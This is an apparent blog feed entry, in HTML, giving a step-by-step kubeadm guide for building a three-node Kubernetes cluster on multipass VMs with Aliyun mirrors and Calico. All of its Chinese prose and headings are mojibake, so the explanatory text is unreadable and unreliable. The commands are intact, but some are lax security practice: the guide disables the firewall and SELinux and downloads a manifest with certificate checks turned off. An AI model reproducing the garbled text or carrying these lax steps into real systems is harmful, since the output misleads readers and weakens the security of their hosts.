      <title>kubeadmæé€Ÿåˆ›å»ºk8sé›†ç¾¤</title>
      <link href="/2022/07/01/kubeadm%E6%9E%81%E9%80%9F%E5%88%9B%E5%BB%BAk8s%E9%9B%86%E7%BE%A4/"/>
      <url>/2022/07/01/kubeadm%E6%9E%81%E9%80%9F%E5%88%9B%E5%BB%BAk8s%E9%9B%86%E7%BE%A4/</url>
      
        <content type="html"><![CDATA[<blockquote><p>æœ¬æ–‡å‚ç…§<a href="https://zhuanlan.zhihu.com/p/430934401">https://zhuanlan.zhihu.com/p/430934401</a>ï¼Œå¹¶å¯¹å…¶ä¸­ä¸€äº›ç‰ˆæœ¬å’Œç»†èŠ‚è¿›è¡Œäº†ä¿®æ”¹ï¼Œä»¥ä¸‹ä»£ç åœ¨2022å¹´4æœˆ5æ—¥å¯ä»¥å®Œç¾è¿è¡Œ</p></blockquote><h2 id="éƒ¨ç½²è™šæ‹Ÿæœº"><a href="#éƒ¨ç½²è™šæ‹Ÿæœº" class="headerlink" title="éƒ¨ç½²è™šæ‹Ÿæœº"></a>éƒ¨ç½²è™šæ‹Ÿæœº</h2><h3 id="ä¸‹è½½multipass"><a href="#ä¸‹è½½multipass" class="headerlink" title="ä¸‹è½½multipass"></a>ä¸‹è½½multipass</h3><p><code>multipass launch -c 2 -m 4g -d 40g -n k8s-master 16.04</code></p><p><code>multipass launch -c 2 -m 3g -d 40g -n k8s-worker01 16.04</code></p><p><code>multipass launch -c 2 -m 3g -d 40g -n k8s-worker02 16.04</code></p><h3 id="æŸ¥çœ‹è™šæ‹Ÿæœºä¿¡æ¯"><a href="#æŸ¥çœ‹è™šæ‹Ÿæœºä¿¡æ¯" class="headerlink" title="æŸ¥çœ‹è™šæ‹Ÿæœºä¿¡æ¯"></a>æŸ¥çœ‹è™šæ‹Ÿæœºä¿¡æ¯</h3><p><code>multipass info --all</code></p><h2 id="ä¸‰å°æœåŠ¡å™¨é…ç½®"><a href="#ä¸‰å°æœåŠ¡å™¨é…ç½®" class="headerlink" title="ä¸‰å°æœåŠ¡å™¨é…ç½®"></a>ä¸‰å°æœåŠ¡å™¨é…ç½®</h2><h3 id="è¿›å…¥ä¸‰å°vmï¼Œåˆ‡æ¢åˆ°rootç”¨æˆ·"><a href="#è¿›å…¥ä¸‰å°vmï¼Œåˆ‡æ¢åˆ°rootç”¨æˆ·" class="headerlink" title="è¿›å…¥ä¸‰å°vmï¼Œåˆ‡æ¢åˆ°rootç”¨æˆ·:"></a>è¿›å…¥ä¸‰å°vmï¼Œåˆ‡æ¢åˆ°rootç”¨æˆ·:</h3><p><code>multipass shell k8s-master </code><br><code>multipass shell k8s-worker01 </code><br><code>multipass shell k8s-worker02 </code></p><h3 id="åˆ‡æ¢åˆ°root"><a href="#åˆ‡æ¢åˆ°root" class="headerlink" title="åˆ‡æ¢åˆ°root"></a>åˆ‡æ¢åˆ°root</h3><p><code>sudo su </code></p><h3 id="ä¿®æ”¹-etc-hostsï¼ˆåªåœ¨masteræ‰§è¡Œä¹Ÿå¯ï¼‰"><a href="#ä¿®æ”¹-etc-hostsï¼ˆåªåœ¨masteræ‰§è¡Œä¹Ÿå¯ï¼‰" class="headerlink" title="ä¿®æ”¹/etc/hostsï¼ˆåªåœ¨masteræ‰§è¡Œä¹Ÿå¯ï¼‰"></a>ä¿®æ”¹/etc/hostsï¼ˆåªåœ¨masteræ‰§è¡Œä¹Ÿå¯ï¼‰</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat &gt;&gt; /etc/hosts &lt;&lt; EOF</span><br><span class="line">172.27.62.80 k8s-master</span><br><span class="line">172.27.51.107 k8s-worker01</span><br><span class="line">172.27.50.93 k8s-worker02</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><h3 id="å…³é—­é˜²ç«å¢™"><a href="#å…³é—­é˜²ç«å¢™" class="headerlink" title="å…³é—­é˜²ç«å¢™"></a>å…³é—­é˜²ç«å¢™</h3><p><code>ufw disable</code></p><h3 id="å°†ipv4æµé‡ä¼ é€’åˆ°iptables"><a href="#å°†ipv4æµé‡ä¼ é€’åˆ°iptables" class="headerlink" title="å°†ipv4æµé‡ä¼ é€’åˆ°iptables"></a>å°†ipv4æµé‡ä¼ é€’åˆ°iptables</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cat &lt;&lt;EOF | sudo tee /etc/modules-load.d/k8s.conf</span><br><span class="line">br_netfilter</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">cat &lt;&lt;EOF | sudo tee /etc/sysctl.d/k8s.conf</span><br><span class="line">net.bridge.bridge-nf-call-ip6tables = 1</span><br><span class="line">net.bridge.bridge-nf-call-iptables = 1</span><br><span class="line">EOF</span><br><span class="line">sudo sysctl --system</span><br></pre></td></tr></table></figure><h3 id="ç¦ç”¨åˆ†åŒºäº¤æ¢"><a href="#ç¦ç”¨åˆ†åŒºäº¤æ¢" class="headerlink" title="ç¦ç”¨åˆ†åŒºäº¤æ¢"></a>ç¦ç”¨åˆ†åŒºäº¤æ¢</h3><h4 id="ä¸´æ—¶å…³é—­"><a href="#ä¸´æ—¶å…³é—­" class="headerlink" title="ä¸´æ—¶å…³é—­"></a>ä¸´æ—¶å…³é—­</h4><p><code>swapoff -a  </code></p><h4 id="æ°¸ä¹…å…³é—­"><a href="#æ°¸ä¹…å…³é—­" class="headerlink" title="æ°¸ä¹…å…³é—­"></a>æ°¸ä¹…å…³é—­</h4><p><code>sed -ri &#39;s/.*swap.*/#&amp;/&#39; /etc/fstab</code></p><h3 id="å…³é—­selinux-centos"><a href="#å…³é—­selinux-centos" class="headerlink" title="å…³é—­selinux(centos)"></a>å…³é—­selinux(centos)</h3><h4 id="ä¸´æ—¶å…³é—­-1"><a href="#ä¸´æ—¶å…³é—­-1" class="headerlink" title="ä¸´æ—¶å…³é—­"></a>ä¸´æ—¶å…³é—­</h4><p><code>setenforce 0 </code></p><h4 id="æ°¸ä¹…å…³é—­-1"><a href="#æ°¸ä¹…å…³é—­-1" class="headerlink" title="æ°¸ä¹…å…³é—­"></a>æ°¸ä¹…å…³é—­</h4><p><code>sed -i &#39;s/enforcing/disabled/&#39; /etc/selinux/config</code></p><h3 id="æ—¶é—´åŒæ­¥"><a href="#æ—¶é—´åŒæ­¥" class="headerlink" title="æ—¶é—´åŒæ­¥"></a>æ—¶é—´åŒæ­¥</h3><p><code>apt-get install ntpdate ntpdate cn.pool.ntp.org hwclock --systohc</code></p><blockquote><p>æ‰€æœ‰èŠ‚ç‚¹å®‰è£…Dockerã€kubeadmã€kubeletã€kubectl</p></blockquote><h3 id="å®‰è£…Docker"><a href="#å®‰è£…Docker" class="headerlink" title="å®‰è£…Docker"></a>å®‰è£…Docker</h3><p>(ä½¿ç”¨é˜¿é‡Œäº‘é•œåƒ,ä¸ä½¿ç”¨é˜¿é‡Œé•œåƒæºä¹Ÿæ²¡é—®é¢˜ï¼Œå›½å†…èƒ½è®¿é—®dockerç½‘ç«™)</p><blockquote><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://link.zhihu.com/?target=https://developer.aliyun.com/mirror/docker-ce?spm=a2c6h.13651102.0.0.68681b11QzKlKm">docker-ceé•œåƒ-docker-ceä¸‹è½½åœ°å€-docker-ceå®‰è£…æ•™ç¨‹-é˜¿é‡Œå·´å·´å¼€æºé•œåƒç«™</a></p></blockquote><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># step 1: å®‰è£…å¿…è¦çš„ä¸€äº›ç³»ç»Ÿå·¥å…·</span></span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get -y install apt-transport-https ca-certificates curl software-properties-common</span><br><span class="line"><span class="comment"># step 2: å®‰è£…GPGè¯ä¹¦</span></span><br><span class="line">curl -fsSL https://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo apt-key add -</span><br><span class="line"><span class="comment"># Step 3: å†™å…¥è½¯ä»¶æºä¿¡æ¯</span></span><br><span class="line">sudo add-apt-repository <span class="string">&quot;deb [arch=amd64] https://mirrors.aliyun.com/docker-ce/linux/ubuntu $(lsb_release -cs) stable&quot;</span></span><br><span class="line"><span class="comment"># Step 4: æ›´æ–°å¹¶å®‰è£…Docker-CE</span></span><br><span class="line">sudo apt-get -y update</span><br><span class="line">sudo apt-get -y install docker-ce</span><br><span class="line"><span class="comment">#å¯åŠ¨dockerå¹¶è®¾ç½®å¼€æœºè‡ªåŠ¨å¯åŠ¨</span></span><br><span class="line">systemctl enable docker &amp;&amp; systemctl start docker</span><br></pre></td></tr></table></figure><h3 id="é…ç½®dockerçš„cgroupä»¥åŠä½¿ç”¨é˜¿é‡Œé•œåƒåŠ é€Ÿå™¨"><a href="#é…ç½®dockerçš„cgroupä»¥åŠä½¿ç”¨é˜¿é‡Œé•œåƒåŠ é€Ÿå™¨" class="headerlink" title="é…ç½®dockerçš„cgroupä»¥åŠä½¿ç”¨é˜¿é‡Œé•œåƒåŠ é€Ÿå™¨"></a>é…ç½®dockerçš„cgroupä»¥åŠä½¿ç”¨é˜¿é‡Œé•œåƒåŠ é€Ÿå™¨</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir /etc/docker</span><br><span class="line">cat &lt;&lt;EOF | sudo tee /etc/docker/daemon.json</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;exec-opts&quot;</span>: [<span class="string">&quot;native.cgroupdriver=systemd&quot;</span>],</span><br><span class="line">  <span class="string">&quot;log-driver&quot;</span>: <span class="string">&quot;json-file&quot;</span>,</span><br><span class="line">  <span class="string">&quot;log-opts&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;max-size&quot;</span>: <span class="string">&quot;100m&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;storage-driver&quot;</span>: <span class="string">&quot;overlay2&quot;</span>,</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://wefdoe4x.mirror.aliyuncs.com&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><p><a href="https://link.zhihu.com/?target=https://wefdoe4x.mirror.aliyuncs.com">https://wefdoe4x.mirror.aliyuncs.com</a>æ˜¯æˆ‘åœ¨é˜¿é‡Œç”³è¯·çš„é•œåƒåŠ é€Ÿå™¨ã€‚</p><h3 id="é‡å¯docker"><a href="#é‡å¯docker" class="headerlink" title="é‡å¯docker"></a>é‡å¯docker</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure><h3 id="å®‰è£…kubeadmã€kubeletã€kubectl"><a href="#å®‰è£…kubeadmã€kubeletã€kubectl" class="headerlink" title="å®‰è£…kubeadmã€kubeletã€kubectl"></a>å®‰è£…kubeadmã€kubeletã€kubectl</h3><blockquote><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://link.zhihu.com/?target=https://developer.aliyun.com/mirror/kubernetes?spm=a2c6h.13651102.0.0.4fd11b11xcJ2f5">kubernetesé•œåƒ-kubernetesä¸‹è½½åœ°å€-kuberneteså®‰è£…æ•™ç¨‹-é˜¿é‡Œå·´å·´å¼€æºé•œåƒç«™</a></p></blockquote><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">apt-get update &amp;&amp; apt-get install -y apt-transport-https</span><br><span class="line">curl https://mirrors.aliyun.com/kubernetes/apt/doc/apt-key.gpg | apt-key add - </span><br><span class="line">cat &lt;&lt;EOF &gt;/etc/apt/sources.list.d/kubernetes.list</span><br><span class="line">deb https://mirrors.aliyun.com/kubernetes/apt/ kubernetes-xenial main</span><br><span class="line">EOF</span><br><span class="line">apt-get update</span><br><span class="line">apt-get install -y kubelet kubeadm kubectl</span><br><span class="line">sudo apt-mark hold kubelet kubeadm kubectl</span><br></pre></td></tr></table></figure><h2 id="åˆå§‹åŒ–é›†ç¾¤-k8s-master"><a href="#åˆå§‹åŒ–é›†ç¾¤-k8s-master" class="headerlink" title="åˆå§‹åŒ–é›†ç¾¤(k8s-master)"></a>åˆå§‹åŒ–é›†ç¾¤(k8s-master)</h2><p>é›†ç¾¤åˆå§‹åŒ–ä½¿ç”¨kubeamd initæŒ‡ä»¤ã€‚</p><blockquote><p>è¯¥å‘½ä»¤æœ‰å¾ˆå¤šå‚æ•°ï¼Œè¯¦æƒ…è¯·æŸ¥çœ‹å®˜ç½‘<a href="https://link.zhihu.com/?target=https://kubernetes.io/docs/reference/setup-tools/kubeadm/kubeadm-init/">https://link.zhihu.com/?target=https%3A//kubernetes.io/docs/reference/setup-tools/kubeadm/kubeadm-init/</a></p></blockquote><p>æ³¨æ„kubernets-versionå¯èƒ½éœ€è¦æ”¹å˜ï¼Œå› ä¸ºå¯èƒ½å’Œkubeletç‰ˆæœ¬ä¸ä¸€è‡´</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubeadm init --apiserver-advertise-address=172.27.62.80 --image-repository registry.aliyuncs.com/google_containers --kubernetes-version v1.23.5  --pod-network-cidr=192.168.0.0/16</span><br></pre></td></tr></table></figure><p>éšåç”Ÿæˆå…³é”®ä¿¡æ¯ï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">[init] Using Kubernetes version: v1.23.5</span><br><span class="line">[preflight] Running pre-flight checks</span><br><span class="line">[preflight] Pulling images required for setting up a Kubernetes cluster</span><br><span class="line">[preflight] This might take a minute or two, depending on the speed of your internet connection</span><br><span class="line">[preflight] You can also perform this action in beforehand using &#x27;kubeadm config images pull&#x27;</span><br><span class="line">[certs] Using certificateDir folder <span class="string">&quot;/etc/kubernetes/pki&quot;</span></span><br><span class="line">[certs] Generating <span class="string">&quot;ca&quot;</span> certificate and key</span><br><span class="line">[certs] Generating <span class="string">&quot;apiserver&quot;</span> certificate and key</span><br><span class="line">[certs] apiserver serving cert is signed for DNS names [k8s-master kubernetes kubernetes.default kubernetes.default.svc kubernetes.default.svc.cluster.local] and IPs [10.96.0.1 172.27.62.80]</span><br><span class="line">[certs] Generating <span class="string">&quot;apiserver-kubelet-client&quot;</span> certificate and key</span><br><span class="line">[certs] Generating <span class="string">&quot;front-proxy-ca&quot;</span> certificate and key</span><br><span class="line">[certs] Generating <span class="string">&quot;front-proxy-client&quot;</span> certificate and key</span><br><span class="line">[certs] Generating <span class="string">&quot;etcd/ca&quot;</span> certificate and key</span><br><span class="line">[certs] Generating <span class="string">&quot;etcd/server&quot;</span> certificate and key</span><br><span class="line">[certs] etcd/server serving cert is signed for DNS names [k8s-master localhost] and IPs [172.27.62.80 127.0.0.1 ::1]</span><br><span class="line">[certs] Generating <span class="string">&quot;etcd/peer&quot;</span> certificate and key</span><br><span class="line">[certs] etcd/peer serving cert is signed for DNS names [k8s-master localhost] and IPs [172.27.62.80 127.0.0.1 ::1]</span><br><span class="line">[certs] Generating <span class="string">&quot;etcd/healthcheck-client&quot;</span> certificate and key</span><br><span class="line">[certs] Generating <span class="string">&quot;apiserver-etcd-client&quot;</span> certificate and key</span><br><span class="line">[certs] Generating <span class="string">&quot;sa&quot;</span> key and public key</span><br><span class="line">[kubeconfig] Using kubeconfig folder <span class="string">&quot;/etc/kubernetes&quot;</span></span><br><span class="line">[kubeconfig] Writing <span class="string">&quot;admin.conf&quot;</span> kubeconfig file</span><br><span class="line">[kubeconfig] Writing <span class="string">&quot;kubelet.conf&quot;</span> kubeconfig file</span><br><span class="line">[kubeconfig] Writing <span class="string">&quot;controller-manager.conf&quot;</span> kubeconfig file</span><br><span class="line">[kubeconfig] Writing <span class="string">&quot;scheduler.conf&quot;</span> kubeconfig file</span><br><span class="line">[kubelet-start] Writing kubelet environment file with flags to file <span class="string">&quot;/var/lib/kubelet/kubeadm-flags.env&quot;</span></span><br><span class="line">[kubelet-start] Writing kubelet configuration to file <span class="string">&quot;/var/lib/kubelet/config.yaml&quot;</span></span><br><span class="line">[kubelet-start] Starting the kubelet</span><br><span class="line">[control-plane] Using manifest folder <span class="string">&quot;/etc/kubernetes/manifests&quot;</span></span><br><span class="line">[control-plane] Creating static Pod manifest for <span class="string">&quot;kube-apiserver&quot;</span></span><br><span class="line">[control-plane] Creating static Pod manifest for <span class="string">&quot;kube-controller-manager&quot;</span></span><br><span class="line">[control-plane] Creating static Pod manifest for <span class="string">&quot;kube-scheduler&quot;</span></span><br><span class="line">[etcd] Creating static Pod manifest for local etcd in <span class="string">&quot;/etc/kubernetes/manifests&quot;</span></span><br><span class="line">[wait-control-plane] Waiting for the kubelet to boot up the control plane as static Pods from directory <span class="string">&quot;/etc/kubernetes/manifests&quot;</span>. This can take up to 4m0s</span><br><span class="line">[apiclient] All control plane components are healthy after 8.011948 seconds</span><br><span class="line">[upload-config] Storing the configuration used in ConfigMap <span class="string">&quot;kubeadm-config&quot;</span> in the <span class="string">&quot;kube-system&quot;</span> Namespace</span><br><span class="line">[kubelet] Creating a ConfigMap <span class="string">&quot;kubelet-config-1.23&quot;</span> in namespace kube-system with the configuration for the kubelets in the cluster</span><br><span class="line"><span class="section">NOTE: The &quot;kubelet-config-1.23&quot; naming of the kubelet ConfigMap is deprecated. Once the UnversionedKubeletConfigMap feature gate graduates to Beta the default name will become just &quot;kubelet-config&quot;. Kubeadm upgrade will handle this transition transparently.</span></span><br><span class="line">[upload-certs] Skipping phase. Please see --upload-certs</span><br><span class="line">[mark-control-plane] Marking the node k8s-master as control-plane by adding the labels: [node-role.kubernetes.io/master(deprecated) node-role.kubernetes.io/control-plane node.kubernetes.io/exclude-from-external-load-balancers]</span><br><span class="line">[mark-control-plane] Marking the node k8s-master as control-plane by adding the taints [node-role.kubernetes.io/master:NoSchedule]</span><br><span class="line">[bootstrap-token] Using token: 4xl3r7.55tcry002k98e4zr</span><br><span class="line">[bootstrap-token] Configuring bootstrap tokens, cluster-info ConfigMap, RBAC Roles</span><br><span class="line">[bootstrap-token] configured RBAC rules to allow Node Bootstrap tokens to get nodes</span><br><span class="line">[bootstrap-token] configured RBAC rules to allow Node Bootstrap tokens to post CSRs in order for nodes to get long term certificate credentials</span><br><span class="line">[bootstrap-token] configured RBAC rules to allow the csrapprover controller automatically approve CSRs from a Node Bootstrap Token</span><br><span class="line">[bootstrap-token] configured RBAC rules to allow certificate rotation for all node client certificates in the cluster</span><br><span class="line">[bootstrap-token] Creating the <span class="string">&quot;cluster-info&quot;</span> ConfigMap in the <span class="string">&quot;kube-public&quot;</span> namespace</span><br><span class="line">[kubelet-finalize] Updating <span class="string">&quot;/etc/kubernetes/kubelet.conf&quot;</span> to point to a rotatable kubelet client certificate and key</span><br><span class="line">[addons] Applied essential addon: CoreDNS</span><br><span class="line">[addons] Applied essential addon: kube-proxy</span><br><span class="line"></span><br><span class="line">Your Kubernetes control-plane has initialized successfully!</span><br><span class="line"></span><br><span class="line">To start using your cluster, you need to run the following as a regular user:</span><br><span class="line"></span><br><span class="line">  mkdir -p $HOME/.kube</span><br><span class="line">  sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config</span><br><span class="line">  sudo chown <span class="variable">$(id -u)</span>:<span class="variable">$(id -g)</span> $HOME/.kube/config</span><br><span class="line"></span><br><span class="line">Alternatively, if you are the root user, you can run:</span><br><span class="line"></span><br><span class="line">  <span class="keyword">export</span> KUBECONFIG=/etc/kubernetes/admin.conf</span><br><span class="line"></span><br><span class="line">You should now deploy a pod network to the cluster.</span><br><span class="line">Run <span class="string">&quot;kubectl apply -f [podnetwork].yaml&quot;</span> with one of the options listed at:</span><br><span class="line">  https://kubernetes.io/docs/concepts/cluster-administration/addons/</span><br><span class="line"></span><br><span class="line">Then you can join any number of worker nodes by running the following on each as root:</span><br><span class="line"></span><br><span class="line">kubeadm join 172.27.62.80:6443 --token 4xl3r7.55tcry002k98e4zr \</span><br><span class="line">        --discovery-token-ca-cert-hash sha256:c3be275e1dee7da9a0f15db2566b1d26d89d069f729b3f3e2f0601ad1775179b</span><br></pre></td></tr></table></figure><h4 id="érootç”¨æˆ·å°†é›†ç¾¤é…ç½®ä¿¡æ¯å­˜å‚¨åˆ°ç³»ç»Ÿä¸­ï¼š"><a href="#érootç”¨æˆ·å°†é›†ç¾¤é…ç½®ä¿¡æ¯å­˜å‚¨åˆ°ç³»ç»Ÿä¸­ï¼š" class="headerlink" title="érootç”¨æˆ·å°†é›†ç¾¤é…ç½®ä¿¡æ¯å­˜å‚¨åˆ°ç³»ç»Ÿä¸­ï¼š"></a>érootç”¨æˆ·å°†é›†ç¾¤é…ç½®ä¿¡æ¯å­˜å‚¨åˆ°ç³»ç»Ÿä¸­ï¼š</h4><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p $HOME/.kube</span><br><span class="line">sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config</span><br><span class="line">sudo chown <span class="variable">$(id -u)</span>:<span class="variable">$(id -g)</span> $HOME/.kube/config</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="rootç”¨æˆ·ï¼šå°†å¦‚ä¸‹å‘½ä»¤åŠ å…¥åˆ°-etc-profile"><a href="#rootç”¨æˆ·ï¼šå°†å¦‚ä¸‹å‘½ä»¤åŠ å…¥åˆ°-etc-profile" class="headerlink" title="rootç”¨æˆ·ï¼šå°†å¦‚ä¸‹å‘½ä»¤åŠ å…¥åˆ°/etc/profile"></a>rootç”¨æˆ·ï¼šå°†å¦‚ä¸‹å‘½ä»¤åŠ å…¥åˆ°/etc/profile</h4><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> KUBECONFIG=/etc/kubernetes/admin.conf</span><br><span class="line"></span><br><span class="line">cat &gt;&gt; /etc/profile &lt;&lt; EOF</span><br><span class="line"><span class="keyword">export</span> KUBECONFIG=/etc/kubernetes/admin.conf</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><h3 id="æŸ¥çœ‹ä¸‹å®¹å™¨ä¸­çš„é•œåƒï¼ˆdocker-imagesï¼‰"><a href="#æŸ¥çœ‹ä¸‹å®¹å™¨ä¸­çš„é•œåƒï¼ˆdocker-imagesï¼‰" class="headerlink" title="æŸ¥çœ‹ä¸‹å®¹å™¨ä¸­çš„é•œåƒï¼ˆdocker imagesï¼‰"></a>æŸ¥çœ‹ä¸‹å®¹å™¨ä¸­çš„é•œåƒï¼ˆdocker imagesï¼‰</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">root@k8s-master:/home/ubuntu# docker images</span></span><br><span class="line">REPOSITORY                                                        TAG       IMAGE ID       CREATED        SIZE</span><br><span class="line">registry.aliyuncs.com/google_containers/kube-apiserver            v1.23.5   3fc1d62d6587   2 weeks ago    135MB</span><br><span class="line">registry.aliyuncs.com/google_containers/kube-proxy                v1.23.5   3c53fa8541f9   2 weeks ago    112MB</span><br><span class="line">registry.aliyuncs.com/google_containers/kube-scheduler            v1.23.5   884d49d6d8c9   2 weeks ago    53.5MB</span><br><span class="line">registry.aliyuncs.com/google_containers/kube-controller-manager   v1.23.5   b0c9e5e4dbb1   2 weeks ago    125MB</span><br><span class="line">registry.aliyuncs.com/google_containers/etcd                      3.5.1-0   25f8c7f3da61   5 months ago   293MB</span><br><span class="line">registry.aliyuncs.com/google_containers/coredns                   v1.8.6    a4ca41631cc7   6 months ago   46.8MB</span><br><span class="line">registry.aliyuncs.com/google_containers/pause                     3.6       6270bb605e12   7 months ago   683kB</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ä»“åº“åœ°å€æ˜¯é˜¿é‡Œäº‘ã€‚</p><p>æŸ¥çœ‹é›†ç¾¤èŠ‚ç‚¹ä¿¡æ¯</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">root@k8s-master:/home/ubuntu# kubectl get node</span></span><br><span class="line">NAME         STATUS     ROLES                  AGE   VERSION</span><br><span class="line">k8s-master   NotReady   control-plane,master   28m   v1.23.5</span><br></pre></td></tr></table></figure><p>NotReadyæ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿè¿™æ˜¯å› ä¸ºæˆ‘ä»¬æ²¡æœ‰é…ç½®ç½‘ç»œæ’ä»¶ã€‚ä»”ç»†çœ‹ä¸Šé¢çš„æ—¥å¿—ä¸­æœ‰è¯´æ˜ã€‚</p><h3 id="å®‰è£…ç½‘ç»œæ’ä»¶-ä½¿ç”¨calico-ï¼š"><a href="#å®‰è£…ç½‘ç»œæ’ä»¶-ä½¿ç”¨calico-ï¼š" class="headerlink" title="å®‰è£…ç½‘ç»œæ’ä»¶(ä½¿ç”¨calico)ï¼š"></a>å®‰è£…ç½‘ç»œæ’ä»¶(ä½¿ç”¨calico)ï¼š</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl apply -f https://docs.projectcalico.org/manifests/calico.yaml</span><br></pre></td></tr></table></figure><p><strong>21ç‰ˆæœ¬ä»¥ä¸Šç”¨ä¸‹é¢è¿™ä¸ªå‘½ä»¤</strong></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">wget https://docs.projectcalico.org/v3.20/manifests/calico.yaml --no-check-certificate</span><br><span class="line"></span><br><span class="line">kubectl apply -f calico.yaml</span><br><span class="line"></span><br><span class="line">kubectl get nodes</span><br></pre></td></tr></table></figure><p>å·²ç»ready</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">root@k8s-master:/home/ubuntu# kubectl get nodes</span></span><br><span class="line">NAME         STATUS   ROLES                  AGE   VERSION</span><br><span class="line">k8s-master   Ready    control-plane,master   31m   v1.23.5</span><br></pre></td></tr></table></figure><h3 id="å‘é›†ç¾¤ä¸­åŠ å…¥èŠ‚ç‚¹ã€‚"><a href="#å‘é›†ç¾¤ä¸­åŠ å…¥èŠ‚ç‚¹ã€‚" class="headerlink" title="å‘é›†ç¾¤ä¸­åŠ 